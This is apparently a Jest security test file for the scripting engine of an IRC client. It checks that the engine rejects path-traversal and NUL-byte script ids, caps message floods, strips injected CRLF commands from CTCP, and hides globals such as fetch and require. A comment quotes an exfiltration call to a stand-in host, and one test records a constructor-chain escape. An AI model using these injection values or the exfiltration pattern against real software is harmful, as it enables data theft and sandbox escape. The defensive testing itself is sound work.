/* Copyright (c) 2025-2026 Velimir Majstorov; SPDX-License-Identifier: GPL-3.0-or-later */
/* eslint-disable no-control-regex -- CTCP is framed with 0x01; asserting on it means writing it. */

// Scripting time is a paywall, not a security boundary; these tests are about
// the boundary, so time is always available here.
const mockIrc = {
  sendMessage: jest.fn(),
  sendCommand: jest.fn(),
};
jest.mock('../../src/services/ConnectionManager', () => ({
  connectionManager: {
    getActiveNetworkId: () => 'net1',
    getConnection: () => ({ ircService: mockIrc }),
    getAllConnections: () => [{ ircService: mockIrc }],
    getActiveConnection: () => ({ ircService: mockIrc }),
  },
}));

jest.mock('../../src/services/AdRewardService', () => ({
  adRewardService: {
    hasAvailableTime: () => true,
    getRemainingTime: () => 3600_000,
    startTracking: jest.fn(),
    stopTracking: jest.fn(),
  },
}));

import { scriptingService } from '../../src/services/ScriptingService';
import { AddonWorkspace } from '../../src/services/scripting/AddonWorkspace';

/**
 * Sprint M3 findings, each pinned by the test that used to fail.
 *
 * A script id is not a label, it is a namespace: it prefixes AsyncStorage keys
 * and timer ids that are matched with `startsWith`, and `api.files` turns it
 * into a directory name. Nothing supplies a crafted id today — every path
 * generates one — but that is a property of the callers, not of the boundary.
 */
describe('script id is treated as a namespace', () => {
  const script = (id: string) => ({
    id,
    name: 'Probe',
    enabled: false,
    code: 'module.exports = {};',
  });

  afterEach(async () => {
    for (const entry of [...(scriptingService as any).scripts])
      if (!entry.builtIn) await scriptingService.remove(entry.id);
  });

  it('accepts the ids the app actually generates', async () => {
    await expect(
      scriptingService.add(script('custom-1758750000000')),
    ).resolves.toBeUndefined();
    await expect(
      scriptingService.add(script('ai-m1x2y3')),
    ).resolves.toBeUndefined();
    await expect(
      scriptingService.add(script('builtin-autoop.v2')),
    ).resolves.toBeUndefined();
  });

  it('refuses an id containing a colon', async () => {
    // Storage keys are `@AndroidIRCX:script:<id>:<key>` and listStorage and
    // clearStorage match with startsWith, so script `a` would see - and be
    // able to clear - everything belonging to script `a:b`.
    await expect(scriptingService.add(script('a:b'))).rejects.toThrow(
      /not a safe namespace/,
    );
  });

  it('refuses an id containing a path separator or dot-dot', async () => {
    // api.files turns the id into a directory name.
    await expect(scriptingService.add(script('../other'))).rejects.toThrow(
      /not a safe namespace/,
    );
    await expect(scriptingService.add(script('a/b'))).rejects.toThrow(
      /not a safe namespace/,
    );
    await expect(scriptingService.add(script('a\\b'))).rejects.toThrow(
      /not a safe namespace/,
    );
  });

  it.each([
    ['empty', ''],
    ['whitespace', 'has space'],
    ['a leading dot', '.hidden'],
    ['a NUL', 'a\0b'],
    ['over-long', 'x'.repeat(200)],
  ])('refuses an id that is %s', async (_label, id) => {
    await expect(scriptingService.add(script(id))).rejects.toThrow(
      /not a safe namespace/,
    );
  });
});

describe('AddonWorkspace refuses to build a root from an unsafe id', () => {
  const workspace = new AddonWorkspace({} as any, '/base');

  it('builds a root for a safe id', () => {
    expect(workspace.rootFor('rs.androidircx.demo')).toBe(
      '/base/rs.androidircx.demo',
    );
  });

  it.each(['../escape', 'a/b', '..', '', 'a\\b', 'a\0b'])('refuses %s', id => {
    // Checked here as well as by the caller: this value becomes a filesystem
    // path, and one caller forgetting is the whole boundary gone.
    expect(() => workspace.rootFor(id)).toThrow(/not safe for a workspace/);
  });
});

describe('a script that blocks the app (M3.2)', () => {
  const slowScript = (id: string) => ({
    id,
    name: 'Slow',
    enabled: true,
    code: `module.exports = { onConnect: () => { const until = Date.now() + 2100; while (Date.now() < until) {} } };`,
  });

  afterEach(async () => {
    for (const entry of [...(scriptingService as any).scripts])
      if (!entry.builtIn) await scriptingService.remove(entry.id);
  });

  it('disables a script that blocks repeatedly, and leaves others running', async () => {
    await scriptingService.add(slowScript('slow-one'));
    await scriptingService.add({
      id: 'fine-one',
      name: 'Fine',
      enabled: true,
      code: 'module.exports = { onConnect: () => {} };',
    });

    const runHook = (scriptingService as any).runHook.bind(scriptingService);
    for (let index = 0; index < 3; index += 1)
      runHook('onConnect', (hooks: any) => hooks.onConnect?.('net1'));

    const scripts = (scriptingService as any).scripts;
    // A synchronous loop cannot be interrupted, so the first freeze happens.
    // What must not happen is it happening again on every start.
    expect(scripts.find((s: any) => s.id === 'slow-one').enabled).toBe(false);
    expect(scripts.find((s: any) => s.id === 'fine-one').enabled).toBe(true);
  });

  it('leaves a script alone when it is merely slow once', async () => {
    await scriptingService.add(slowScript('slow-two'));

    const runHook = (scriptingService as any).runHook.bind(scriptingService);
    runHook('onConnect', (hooks: any) => hooks.onConnect?.('net1'));

    const scripts = (scriptingService as any).scripts;
    expect(scripts.find((s: any) => s.id === 'slow-two').enabled).toBe(true);
  });
});

describe('a script that floods (M3.2)', () => {
  const api = (id: string) =>
    (scriptingService as any).makeApi({
      id,
      name: 'Flooder',
      code: '',
      enabled: true,
    });

  afterEach(async () => {
    (scriptingService as any).sendBudgets.clear();
    for (const entry of [...(scriptingService as any).scripts])
      if (!entry.builtIn) await scriptingService.remove(entry.id);
  });

  it('lets a legitimate burst through untouched', () => {
    const send = api('burst').sendMessage;
    // /opall on a fifty-user channel has to keep working.
    for (let index = 0; index < 50; index += 1) send('#a', `line ${index}`);

    const bucket = (scriptingService as any).sendBudgets.get('burst');
    expect(bucket.dropped).toBe(0);
  });

  it('drops the rest of a runaway loop instead of flooding the server', () => {
    const send = api('runaway').sendMessage;
    // Without this the user gets G-lined by their own client, which is a ban
    // they did nothing to earn.
    for (let index = 0; index < 500; index += 1) send('#a', 'spam');

    const bucket = (scriptingService as any).sendBudgets.get('runaway');
    expect(bucket.dropped).toBeGreaterThan(0);
  });

  it('disables a script that keeps flooding', async () => {
    await scriptingService.add({
      id: 'persistent',
      name: 'Persistent',
      enabled: true,
      code: 'module.exports = {};',
    });

    const send = api('persistent').sendMessage;
    for (let index = 0; index < 400; index += 1) send('#a', 'spam');

    const script = (scriptingService as any).scripts.find(
      (entry: any) => entry.id === 'persistent',
    );
    expect(script.enabled).toBe(false);
  });

  it('budgets each script separately', () => {
    const noisy = api('noisy').sendMessage;
    for (let index = 0; index < 500; index += 1) noisy('#a', 'spam');

    api('quiet').sendMessage('#a', 'one line');
    const quiet = (scriptingService as any).sendBudgets.get('quiet');
    expect(quiet.dropped).toBe(0);
  });

  it('covers the action and CTCP paths, which call IRC directly', () => {
    // These two bypassed the budget in the first version of this fix: they
    // reach ircService.sendMessage without going through scriptSendCommand,
    // so "every send path is covered" was not true until they were added.
    const viaAction = api('act');
    for (let index = 0; index < 500; index += 1)
      viaAction.action('#a', 'waves');
    expect(
      (scriptingService as any).sendBudgets.get('act').dropped,
    ).toBeGreaterThan(0);

    (scriptingService as any).sendBudgets.clear();
    const viaCtcp = api('ctcp');
    for (let index = 0; index < 500; index += 1)
      viaCtcp.sendCTCP('fred', 'VERSION');
    expect(
      (scriptingService as any).sendBudgets.get('ctcp').dropped,
    ).toBeGreaterThan(0);
  });

  it('holds a CTCP to one line and a real verb', () => {
    const scripted = api('ctcp-shape');
    // A CTCP carries attacker-chosen bytes to an attacker-chosen nick. The
    // channel cannot be closed without removing CTCP, but it can be bounded.
    scripted.sendCTCP('fred', 'VER SION\r\nQUIT', 'x'.repeat(2000));

    const [, sent] = mockIrc.sendMessage.mock.calls.at(-1)!;
    expect(sent).not.toMatch(/[\r\n]/);
    expect(sent.length).toBeLessThan(500);
    // The verb is the first token: stripping the separators instead would
    // weld 'VER SION QUIT' into one verb nobody wrote.
    expect(sent).toMatch(/^\u0001VER /);
  });

  it('refuses a CTCP whose verb is entirely punctuation', () => {
    mockIrc.sendMessage.mockClear();
    api('ctcp-empty').sendCTCP('fred', '!!!');
    expect(mockIrc.sendMessage).not.toHaveBeenCalled();
  });

  it('covers every send path, not just one', () => {
    const scripted = api('paths');
    for (let index = 0; index < 500; index += 1) scripted.sendNotice('#a', 'x');
    expect(
      (scriptingService as any).sendBudgets.get('paths').dropped,
    ).toBeGreaterThan(0);

    (scriptingService as any).sendBudgets.clear();
    const viaCommand = api('paths2');
    for (let index = 0; index < 500; index += 1) viaCommand.op('#a', 'fred');
    expect(
      (scriptingService as any).sendBudgets.get('paths2').dropped,
    ).toBeGreaterThan(0);
  });
});

describe('what a script can reach from global scope (M3.1)', () => {
  /** Ask a compiled script what it can see, through the real compile path. */
  const probe = (expression: string): unknown => {
    const compiled = (scriptingService as any).compile({
      id: 'probe',
      name: 'Probe',
      enabled: true,
      code: `module.exports = { look: () => (${expression}) };`,
    });
    return compiled.hooks?.look?.();
  };

  it.each([
    'fetch',
    'XMLHttpRequest',
    'WebSocket',
    'global',
    'globalThis',
    'process',
    'require',
    'Function',
  ])('cannot see %s', name => {
    // `fetch` was simply there, which made the web allowlist decorative:
    //   fetch('https://evil.example/collect', {method:'POST', body: secrets})
    // That is the info-stealer shape, and it needed no permission at all.
    expect(probe(`typeof ${name}`)).toBe('undefined');
  });

  it('still has the ordinary language available', () => {
    // Shadowing must not take away the things a script legitimately needs.
    expect(probe('typeof JSON')).toBe('object');
    expect(probe('typeof Math')).toBe('object');
    expect(probe('typeof Date')).toBe('function');
    expect(probe('typeof Promise')).toBe('function');
    expect(probe('typeof setTimeout')).toBe('function');
  });

  it('still has its api', () => {
    expect(probe('typeof api')).toBe('object');
  });

  it('is not a sandbox, and the test says so rather than pretending', () => {
    // A constructor chain still reaches the real global object. Closing that
    // needs a separate realm, which is exactly what imported packages get and
    // legacy scripts do not. Recorded so nobody later reads the shadowing
    // above as isolation.
    expect(probe('typeof ({}).constructor.constructor')).toBe('function');
  });
});
